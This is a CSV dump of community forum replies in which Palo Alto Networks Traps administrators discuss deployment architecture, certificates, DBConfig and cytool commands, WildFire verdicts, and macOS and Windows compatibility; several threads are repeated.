link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
515,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
516,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
517,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
518,194382,thinson,We use internal certs generated from our PKI. You want to have a cert issued with the following intended purposes: client authentication and Server Authentication. Of course make sure your root certs are trusted on the ESM servers and all the agents.,0,01-09-2018,11:43 AM
519,194382,ZEBIT,Can you tell me in detail how you configured it?,0,01-10-2018,06:52 AM
520,194382,thinson,Not sure what configuration aspects you are refering to? There is nothing that needs to be done on the Traps side other than specifiying to use SSL. As long as the agents and servers are using those certs and trust the root...all is well and should work.,0,01-10-2018,07:07 AM
521,194382,ZEBIT,"Hi Thinson,On my CA which templates I need to make available what to configure on the templates?What todo on the traps server?",0,01-10-2018,11:20 PM
522,194382,ElasticSkyX,"Hi there,Probably too late but you need to duplicate the WebServer template and add the “client authentication” to the application policy. I called mine WebServerAuth but feel free to name this as you see fit.From this new template you can create certificates for the ESM environment which meet the minimum requirements.Let me know if you need more detailed help.Kind regards.",0,05-18-2018,10:23 PM
523,212834,mdw189,Do you have the certificate chain that Traps uses on the mac and trusted?,0,05-03-2018,04:56 AM
524,212834,Sampan,Added and trusted the certificate and the certificate is purchased from GoDaddy.,0,05-03-2018,05:50 PM
525,212834,JNK_90,"Hi,have youallowed the execution of Palo Alto Networks under security & privacy?Please go to security & privacy, maybe you can see a PaloAlto Networks entry below on the page, where you can allow the execution.Then please try check-in again.Best regards,Jan",0,05-07-2018,04:48 AM
526,212834,Sampan,"HI,There is nothing show onsecurity & privacy after installed Traps on Mac.ThanksSam",0,05-08-2018,07:02 PM
527,212407,AriKukkonen,"ok,I was able to fix this.Removed core from server and then reinstalled it and now everything is back to normal and we have 4.1.4 installed.I was just very careful as this was first time ever I had any problems with upgrades and I have been participating all betas etc.",0,05-01-2018,10:46 AM
528,211900,thinson,Starting in v4 Traps started registering with Microsoft Security Center as the AV and Defender would be disabled. You can change this behavior if you desire to keep running Defender in tandem with Traps. It requires a change on the Traps ESM server using the DBCONFIG tool. There may be a KB entry on the support side or you might just want to open a ticket with support and request guidance.,0,04-26-2018,08:48 AM
529,211900,BigPalo,Where can i get this KB?? its public? thanks,0,04-26-2018,02:35 PM
530,211900,thinson,"Here is a link to the info on DBCONFIG tool:https://live.paloaltonetworks.com/t5/Endpoint-Articles/How-to-Use-the-DBconfig-Tool-in-Traps/ta-p/65...The specific info on how to configure Traps to not register as the system AV with Security Center is not listed there. My notes say that the command is ""dbconfig server SecurityCenterEnabled false"". It sure wouldnt hurt to open a ticket with support and verify that this is still correct and that you understand the impact.Hope this helps!",0,04-27-2018,05:44 AM
531,211900,BigPalo,"Thanks a lot, i opened TAC case. Im waiting for response. Thanks a lot",0,04-27-2018,05:50 AM
532,210504,BPry,"@abdul.altamimi,You should be able to contact your sales team to accomplish this.",0,04-19-2018,12:16 PM
533,199662,JamesWW,"Just had a look on my firewall and it only seems to be using port 443 and the URL is <customer>.traps.paloaltonetworks.com. The IP address corresponds to an AWS address range, so I doubt you will be able to limit it down to a destination range. If you need to limit the destination, its probably only going to be possible via URL.",0,03-23-2018,03:46 AM
534,199662,milling,Select Traps Management Service in apps. Thats all.,0,04-09-2018,05:05 PM
535,208391,thinson,The 4.1.3 version has some improved ransomware detection capabilities in it. I imagine once the process hit the decoy files it would be stopped from further damage. There are several variants of SamSam and I am sure that Wildfire has malicious verdicts for many of the artifacts. If you are a member of an information sharing group or subscribe to a threat intel subscription you may be able to obtain some IOC's for this particular strain. You could check some of those hash values in Wildfire to see what the verdicts are.,0,04-02-2018,07:17 AM
536,207697,JNK_90,"Hi,wildfire post detection means that in first step the local analysis of the client has flagged the executable/macro/DLL as benign. In parallel the file is uploaded to wf and analysed by static analysis and dynamic one. Afterwards the wildfire verdict is malware for your file. ESM gets the verdict and creates this wildfire post detection event, because the local analysis verdict (benign) from the endpoint is changed to malware (wf verdict). So if thisis your intial run of this fileand you are running on prevention mode, thefile would have beenexecuted on the client. After the wf verdict is availableon theesm, further execusions would be blocked.In your case it does not matter, because you have applied a notification rule, so every file can be executed independently of the verdict.To point 3: I would say, you are right. Maybe paloalto engineer or pan support can give you deeper information.I hope that helps you.BR,Jan",1,03-29-2018,05:21 AM
537,206317,ancis,You can change the password with the DBconfig tool. If you open a case with support they will send you instructions.,0,03-19-2018,05:50 AM
538,206317,hu_omi,"Thank you, are you from PaloAlto support or sw engineer?You agree with me that this change in the documentation should be large, bold and mandatory and should not be requested via support.",0,03-19-2018,06:01 AM
539,206317,ancis,"Yes and no. Yes, it should be better documented. No, specific information about a password or account that a security product uses, should have some control in the finer details being publicized. Which is why, support should have no issue passing you the information, on how to modify the password. The details of the account and function could use better detailing, in the admin guide.",0,03-19-2018,06:04 AM
540,206317,hu_omi,"No, specific information about a password or account that a security product uses, should have some control in the finer details being publicized.Why not, every default password from trapsshould be in the public documetation, with a requirement to change it. If you search in the internet you find it anyway.Only one good example where PaloAlto has done it:https://www.paloaltonetworks.com/documentation/41/endpoint/endpoint-admin-guide/administer-the-esm-s...Sorry for saying: all other obfuscation ist security by obscurity.",0,03-19-2018,07:11 AM
541,206317,hu_omi,"i find it out, it is analog to the ninja pw change:C:\Program Files\Palo Alto Networks\Endpoint Security Manager\Server>DBConfig.exe server TrapsDownloaderPassword <YOUR_PASSWORD>thx for the hintF.Hufschmid",0,03-19-2018,07:49 AM
542,204351,ancis,"Can someone explain how in a DMZ environment a DMZ agent sends its files to be checked to the Wildfire Cloud?The ESM core in the DMZ sends the file to wildfire, the database stores the transaction, the console displays some of the details (like the Hash, and the verdict associated with the hash)Does the ESM have to be installed with the console, mostly the internal ESM, have access to the BITS folder on the DMZ ESM, if so why?im not sure i understand the questions, but ill do my best to answer; In any environment, you on need a single console. This console should be installed on the internal network. the DMZ core does need to be configured to allow bits traffic and have a matching quarintine folder setup.Doesn't the DMZ Agent send its files to the DMZ ESM, which loads them into the Wildfire Cloud itself? The internal ESM only receives the event, whether the upload took place or not and the Verdict.correct.Which ports must be open from the internal ESM to the DMZ ESM and which ports must be open in the opposite direction?443/80(depending on SSL or not), 1433. 1433 just needs to be inbound",1,03-08-2018,08:33 AM
543,204351,hu_omi,"Hi efrancis,Ok there is no connection required between the internal ESM and DMZ ESM Core on port 80/443 for BITS files transfer. The ESM Core can handle the upload to the wildfire, without the internal esm, if i understand you correct.thx",0,03-08-2018,08:42 AM
544,204351,ancis,"Each of the cores and the single console do not communicate with eachother at all. the only pieces that shares a connection to the core and console, is the database. Each piece stands alone from eachother",1,03-08-2018,08:44 AM
545,204351,hu_omi,"Hi All,i have now the answer for my own question:Every esm need a connection to all BITS folder (BITS should go over Port 443). Because on all esm servers aresheduled tasks running which search for pending files on all BITS folder to upload to wildfire . Therefore all ESM servers need a wildfire connection.Additionally every esm access this BITS folders with a https:// adress, therefore you have to check, that on all esm you trust the certificate if you have an own CA, also if the esm and BITS folder is on the same esm host. DMZ servers are mostly not in a domainjoin and does not trust the own CA, then you have to import an intermediate certificate.I hope you understand now the process which is used in ESM to upload Wildfire samples.Fabio",0,03-16-2018,05:51 AM
546,205321,mdw189,C:\Program Files\Palo Alto Networks\Traps\cytool runtime [start|stop]You'll be prompted for the password...You can break it down even more to specific components but here's more info on it.https://www.paloaltonetworks.com/documentation/34/endpoint/endpoint-admin-guide/troubleshooting/cyto...,0,03-14-2018,01:27 PM
547,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
548,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
549,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
550,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
551,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
552,204349,thinson,"I do not know the answer to your question but I imagine a call to support can help. I did want to mention that our Traps engineer who helped us with our deployment recommended we NOT enable the quarantine option and I believe that was partially due to this issue. I remember him saying that they restore options were not always straight forward and that Traps was going to block execution anyway, might as well leave the file where it is.",0,03-12-2018,05:07 AM
553,204349,ancis,"You can use the built in tool: cytoolhttps://www.paloaltonetworks.com/documentation/34/endpoint/endpoint-admin-guide/troubleshooting/cyto...If you have questions about the process in the link, I would recommend to open a case with traps support.",0,03-12-2018,06:30 AM
554,204349,hu_omi,"Hi efrancis,I tried this solution a time before, but this doesn'twork, because the same file (Hash identical) generates a different guid, therefore you can not have a script with a guid included. In addition, the recovery path does not necessarily have to be the same on all clients.I placed this question to paloalto support, but still no answer.Thx fabio",0,03-12-2018,07:01 AM
555,203879,MarkusHenzler,Hi.I guess this article will helphttps://live.paloaltonetworks.com/t5/Endpoint-Articles/Traps-on-the-Endpoint-Security-Manager-Loses-...You have to bind the new certificate to the Traps communication port…Markus,1,03-08-2018,04:34 AM
556,155352,Willian,"Hi@Alex_GomezLegitimate applications don't typically execute from locations such as%AppData%,%LocalAppData%,%temp% or others. Best practice is to not allow any executables to execute from these locations, as it is a typical malware bahaviour, such as ransomwareA notable behavior used by several Ransomware, including Cryptolocker, is to run its executable from %AppData%, %LocalAppData% or %%temp.If you need specific applications to run from these locations, the best recommendation is to use the Whitelisting functionality by specifying the actual location where the executable should be allowed to run, then you will be safe.There is a list of specific child process on Windows that as best practice you should whitelist, in order to allow functionality of several applications.Here is a link to some of the policies I use in order to blacklist and whitelist specific directories.https://www.dropbox.com/sh/0e9e64aj6cxaqqh/AACiUd6I4RVKUbhHhn5IiiTla?dl=0I hope it helps,",1,05-11-2017,06:48 PM
557,155352,Alex_Gomez,Thanks@Willianwith the link to those Policies.. whats the best way to import them or view them ?,0,05-11-2017,08:49 PM
558,155352,Willian,"Hi @Alex_GomezIn order to import the rules you go to Policies > Exploit > Import Rulesin the ESM console as per the screenshot below:As for viewing the rules, you can use any editor such as Notepad++, Notepad or Wordpad because it is only a .XML file.I hope this helps.",0,05-11-2017,09:21 PM
559,155352,Alex_Gomez,I'm seeing this when i try importing,0,05-11-2017,09:28 PM
560,155352,Alex_Gomez,All Good now was able to import..!!Cheers,1,05-11-2017,09:42 PM
561,155352,DennisBray,Thanks for sharing the policy files.Dennis,0,02-26-2018,01:10 PM
562,201106,JokinLete,Here are the scrrenshots of the configuration.,0,02-19-2018,04:22 AM
563,201106,tobar,"Hi,By default Java is monitored by suspicious or exploitation behavior, by default traps enable a rule for java like as another process, please check the reputation of those files (.exe) and if someone else are trying to use them.Regards,",0,02-23-2018,11:38 AM
564,201106,JokinLete,"Hi,The file detected is a link to the mail.The detection is a false positive, and we want to exclude it. The problem is that the policies are being applied correctly (I can see the policy in the agent) but the detection is always in notification mode. There is no policy in notification mode. All default rules are in prevention mode, and also the ones that I'm creating are in prevention mode.I also tried to disable all EPM to test it, and it still continues detecting the file (the plicy is being applied correctly).I do not understand what is happening.Regards.",0,02-26-2018,07:50 AM
565,201695,tobar,"Hi,I'm not sure if I undertood very well, but you want to know if Traps can perform a forensic analysis, if is yes, Traps client take the events and send it to ESM, but you can create a rule on ESM to collect forensic or files from the client.If the issue (registry deleted) was perform when traps was enabled, you need to check your policies, first 'cause traps has the option to protect the services against malware or malintentioned actions, then second if that happend you don't have configured traps correctly.Check Policies>Forensics, on ESM console.The best regards,wtobar",1,02-23-2018,12:09 PM
566,201695,attarachai,"@wtobarThanks for the suggestions for me, I'll try using the following information",0,02-25-2018,06:27 PM
567,202059,ancis,"Dennis,With non-persistent virtual desktops, the Traps agent receives a licenses from the pool of available endpoint licenses. The ESM automatically revokes the license when the user logs off, the agent is uninstalled, the session ends, or when the VDI is inactive for two consecutive heartbeats plus 25 minutes. Revoking the license frees it up for use by another Traps agent.This means that the agent checks in with an active user, a license will be allocated to the traps client, a command is sent to the ESM to revoke the license when a user logs off. Until the agent from an active users session checks in, the machine will appear unlicensed. The agent attempts to check in as soon as a user logs into the VDI.What you describe is expected behavior.",0,02-23-2018,10:15 AM
568,202059,DennisBray,Thanks for the confirmation!,0,02-23-2018,10:17 AM
569,199557,tobar,"Hello@sbessat!I saw that event in my console, but in my case that happend when my network has some latency but that not impact in agents protection.Regards,wtobar",0,02-08-2018,08:52 AM
570,199557,sbessat,,0,02-09-2018,02:26 AM
571,199557,tobar,"Hi@sbessatI just check my security alerts and saw only 4 events starting on jan about that issue, but for network latency, I use 4.1.2 version on ESM and some agents, may you requiere submit case to paloaltonetworks support if your events are continues or higher.Regards,wtobar",0,02-09-2018,05:38 AM
572,199557,JNK_90,"Hi,I got the same issue (same day, same events). After the 08.02. these notifications were reduced to only twoor four a day.Today I have opened a case to analyze the root cause of this issue.@sbessatHave you opened a case as well? Do you have first PAN support results?Thanks and best regards,Jan",0,02-12-2018,05:32 AM
573,199557,sbessat,"Hello,I haven't opened a case yet, but I checked and as you, fom the 08.02, the notifications have considerably decreased.As there was a problem from the WildFire service side and they are on the way to resolve it.",0,02-12-2018,06:10 AM
574,194530,MohamedSharief,"Hi @trondk,This is basically telling you that the connection has been restored to WildFire. Its a pure connection issue with either ESM to WildFire or Agent to ESM Server.You need to check your internet connection from ESM Server to WildFire or your internal connectivity between the agent and ESM Server using.As per my knowledge there is no feature on Traps that can monitor the connection status but you can have 3rd party tool to help you.",1,01-17-2018,05:49 AM
575,194530,trondk,Thank you very much for your input!,0,01-17-2018,10:17 AM
576,193647,MohamedSharief,"I assume the only solution for this at the moment till PA release something is to use internal CA, import the certificate on the Server and use the internal CA root cert on the client. in case of roaming users the root certificate will be added by support team and they can connect normally in that case.The connection will not work if the PC doesn't have this root certificate.Regards,Sharief",0,01-17-2018,05:55 AM
577,193827,thinson,Same questions for running Traps 4.0.4,0,01-04-2018,04:56 AM
578,193827,kar,I have the same question for Traps 4.1.1.,0,01-04-2018,05:07 AM
579,193827,perezBM,Same for 4.0.1,0,01-04-2018,05:14 AM
580,193827,jhoge,"4.1.2 here, also needing an update on this.Kevin Beaumont is maintaining a spreadsheet on AV compatibility, but unfortunately, there is no word from PAN yet about Traps.https://www.reddit.com/r/sysadmin/comments/7o2q28/av_compatibility_with_windows_patches_for/https://docs.google.com/spreadsheets/d/184wcDt9I9TUNFFbsAVLpzAtckQxYiuirADzf3cL42FQ/htmlview?sle=tru...",2,01-04-2018,08:00 AM
581,193827,thinson,I have asked our Traps account team and they are working on getting an answer. I'll be sure to update the thread if I hear anything.,1,01-04-2018,08:28 AM
582,193827,thakala,"I have patched Windows Server 2016 running Traps 4.1.2, no issues so far. Required registry key was added on this system automatically so patch was downloaded automatically from Windows Update.On Windows 10 Desktop running Traps 4.1.2 I had to add required registry key manually to download Windows Patch. Once key was added Windows Update was able to see new patch and I installed it. I am typing this message on patched Windows 10 running Traps 4.1.2 and no issues so far, I even intentionally triggered a Wildfire execution block (no blue screen etc) but I have not tested actual exploit preventions.But to be sure I would wait an official statement from PANW.",3,01-04-2018,01:34 PM
583,193827,csidwellsm,Here is the latest information.https://live.paloaltonetworks.com/t5/Endpoint-Articles/Steps-to-Apply-Microsoft-Patch-to-Addressed-M...,3,01-05-2018,05:56 AM
584,192442,thinson,I do not think there is a way to use Traps to deploy files. Traps can deploy an upgrade for an agent and content updates. That's about it.,0,12-20-2017,04:53 AM
585,192442,junaidaj86,"Thanks a lot.I had one more query,If we figure out that a machine/endpoint is under attack, can we isolate the machine/enpoint from network using either Traps or wildfire?",0,12-20-2017,10:25 PM
586,192442,thinson,"Traps does not have the capability to isolate the computer. You would need to employ another tool to do that. Something like Forescout, Tanium or CarbonBlack Response. If you are using the Palo firewall you could have the impacted host added a dynamic group that has restricted internet access.",0,12-21-2017,07:31 AM
587,147983,SvenMik,"Hello Bernhard,At this moment youcannot control Trusted Publishers other than applying Content Updates. You can find the entries in the database tables dbo.Publishers. Maybe you can control it by adding your certificates to the PublisherName field? I know you can use it the other way around by removed entries.Please note that I have not tested this method and probably is not recommended by Palo Alto Networks. So use/test at your own risk 🙂 And also inform me if it works or not!",0,03-27-2017,06:34 AM
588,147983,soporteseguridaaria-labeld,"Hi,i have the same problem. I would like to add my certificates in order to not sent these files to widlfire. How can we add my certs to traps??",0,11-28-2017,06:49 AM
589,147983,thinson,Contact support. There is a method for adding your own certs to trust. It's nothing you can do through the GUI.,0,11-28-2017,06:54 AM
590,147983,soporteseguridaaria-labeld,"Ok, but if we add our certs, and we dont have enable local analysis. The files (with our cert) will be send to wildfire???",0,11-28-2017,07:01 AM
591,172819,thinson,We use the XML format so that we can force the malware verdict. When we deployed Traps we had the assistance of a Traps PSE. He wrote a short powershell script that will take a txt file of SHA256 hashes and convert them into an XML file that you can then import. This works in 3.4.X and 4.0.X.,1,11-27-2017,11:32 AM
592,172819,bernhardschmid,"Thank you, works like a charm with 4.1.1",0,11-28-2017,02:01 AM
593,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
594,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
595,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
596,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
597,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
598,176065,MichaelMelone,You pretty much got it.Stop IIS and Endpoint Security Manager (cyveraserver) services.Backing up the database and snapshotting the server are good practices.Pretty sure you don't need a reboot. I've based my upgrade procedures off this article and I've had nothing but good results:https://live.paloaltonetworks.com/t5/Endpoint-Articles/System-upgrade-best-practice/ta-p/75400,1,09-12-2017,08:28 AM
599,176065,ESutedy,thanks @MichaelMelone,0,09-12-2017,03:23 PM
600,176065,thinson,"Followed that article to the ""T"" and both my UA and PROD upgrades went without a hitch from 4.0.3 to 4.0.4. Thanks for sharing that link!",0,11-27-2017,11:35 AM
601,175254,tag,"same question here. we are running traps in a test period on a few Macs here (around 10 Devices, macOS >= 10.12). we just started with the default policies.but sometimes the first start of an application on a macOS Device does not work. the user has to stop/kill the process and start the application again. i can not really see anything in the esm log to analyze the problem. Sometimes the problem occurs with Apps which has been classified as Grayware.Can someone share his experience with Traps and macOS? I am really interested in a review (Traps and macOS).Thanks and greetingsbastian",0,11-10-2017,03:12 AM
602,183028,BEASG-IT,I am looking for an answer too as I need to decidewhether to switch to Traps next year. Market adoption for next gen AV will be slow without a proper benchmarkingand continuos assessment on their effectiveness against those brick and mortal AV agent that kept us alivefor the pass many years.,0,11-01-2017,08:57 PM
603,183028,chrislss,"The product is definitely positioned as a full AV replacement. Microsoft recognizes Traps as a full AV solution in Windows Security Center, and the AV-Test institute certified Traps as well. It would be interesting to hear experiences from those who have deployed the product as the sole endpoint anti-virus/malware agent.https://www.av-test.org/en/it-security-product-overview/",1,11-02-2017,12:18 PM
604,183028,Harvester757,"Unfortunately, our installations of Traps client version 3.4 are NOT recognized by Windows 10. Windows continues using Defender. And, if we disable Defender, Windows Security Center sends alarms. Do we need a newer version of Traps?Thanks in advance!",0,11-03-2017,11:16 AM
605,183028,chrislss,Updating the traps release is needed as the integration occurred as part of the 4.0 release:https://www.paloaltonetworks.com/documentation/40/endpoint/newfeaturesguide/security-features/traps-...,0,11-03-2017,11:41 AM
606,181626,MichaelMelone,"In my experience, I have found that shortening the agent heartbeat time from 60 min to 10 or 15 gives you better metrics on who is connected. It also provides quicker policy pushes and agent upgrade actions (if you use ESM to upgrade instead of SCCM).",0,10-13-2017,11:33 AM
607,181626,thinson,During rollout of Traps a 10 minute setting is nice as long as it doesn't bog the ESM down. If you need to make a quick change the agents will pick it up quickly. We had our set to 30 minutes during rollout and will probably keep it that way since it does not seem to be impacting the ESM servers negatively.,0,10-25-2017,04:27 AM
608,179946,thinson,"You can select multple agents on the agent monitor page and delete them. You could create a filter to list specific agents, say disconnected agents older than X days, select all and then delete them. However, if it's more than a few pages of return data the process will error out. Something Palo needs to correct.I had a similar issue where I wanted to bulk delete agents in my UA environment. i had to open a support case and work with an engineer to build our a special SQL query to take care of this.",0,10-25-2017,04:23 AM
609,179659,MichaelMelone,Traps 4.1.1 for MAC has 10.13 support.,0,10-18-2017,02:30 PM
610,179659,MichaelMelone,FYI: If you run apple enterprise connect or other AD password syncing tools on mac:,0,10-19-2017,08:56 AM
611,170527,matin.logmein,"The only way we could stop traps was to run the uninstall, perform the task that was halted by traps and reinstall.",0,08-24-2017,12:21 PM
612,170527,Mattheweharding,Try thiscommand:Sometimes I find you have to run this command to get cytool to run correctly. Haven't figured out why.,0,10-19-2017,06:18 AM
613,170527,afogel,"Hi,Pleasesee thereference in the admin guide:RPCs are used by the Traps agent and daemons to access persistent databases, change log levels, and connect or disconnect from the ESM Server.We are looking into enhancing this flow in a future version.Thanks!Aviel",0,10-19-2017,07:21 AM
614,170527,Mattheweharding,That explains why it's needed before running the check-in command.Can I request that the cytool runtime start command matches the Windows equivalent? Adding all to the macOS side drives me insane!,0,10-19-2017,07:50 AM
615,167258,BPry,This would technically be considered a roadmap discussion and therefore would need to go through your SE to get an official answer. Howerver I would expect that by general release the Traps agent will be fully compatable.,0,07-25-2017,12:22 PM
616,167258,MichaelMelone,Thanks for the info BPry. I also had a feeling something will be ready once High Sierra is avalible to the general public audiance.,0,07-25-2017,12:25 PM
617,167258,DanMorrow,"I am not sure about the time line for Palo Alto. High Sierra intruduces Apple's new APFS. This may cause some issues, while the file system is settled, Apple's own support for it, isn't. Still changes to come, expect an October announcement from Apple. At the moment, 10.13 testers have no solution from any vendor at this point.",0,08-07-2017,10:27 AM
618,167258,MyBudget,Well 10.13 has been GA for 2 weeks now. Has anyone heard if there is a new Mac TRAPS client in the works?,0,10-08-2017,04:20 PM
619,167258,MichaelMelone,Looks like Traps 4.1.1 has included support for 10.13 High Sierra,0,10-18-2017,12:04 PM
620,176314,kiwi,Moving this to the Traps discussions.Cheers !-Kim.,0,09-13-2017,06:55 AM
621,176314,Dietrich,Sorry about that.Does anyone know whether or not Traps can see into the pico processes?,0,09-15-2017,08:08 AM
622,176314,BPry,"@Dietrich,Can you define what you mean by PICO; I'm only familar with that acronim in healthcare and sadly that doesn't mean anything here.",0,09-15-2017,01:04 PM
623,176314,Dietrich,"@BPryhttps://blogs.msdn.microsoft.com/wsl/2016/05/23/pico-process-overview/This is what I'm referring to. It's the ""minimal process that is associated with a pico profider kernel-mode driver."" I'm curious if Traps can see these processes in Windows 10 when using Windows Subsystem for Linux (WSL). Bashware can leverage these processes to avoid detection from antivirus software installed on windows by utilizing these processes and I'm looking for clarification on how Traps does or does not protect against this.",0,09-16-2017,10:48 AM
624,176314,BPry,"@Dietrich,So I actually just looked through my processes on the ESM console and they do detect processes running from within the Bash shell. I looked at a few of them that I know I would have been using and from what I can see non of them are protected by default, meaning you would have to setup the process in a provisional or protected state yourself.Hope that helps, looks like you could pretty easily make Traps compliant with whatever protections you need but it wouldn't be enabled by default.",0,09-18-2017,05:36 AM
625,176314,Dietrich,@BPryThat's great news. Can you share how you had that configured?,0,09-18-2017,06:05 AM
626,176314,BPry,"@Dietrich,I actually don't have any specific to these types of processes, as far as I'm aware I'm the only person running Bash in our enviroment and I only use it for it's built in SSH capablities. That being said setting up process protection and linking subsequent EPM rules would be the same as adding protection to a custom or otherwise unprotected process; I highly recommend reaching out to your SE and getting in touch with your regions endpoint protection team, they can help you along this process.",0,09-18-2017,06:11 AM
627,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
628,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
629,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
630,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
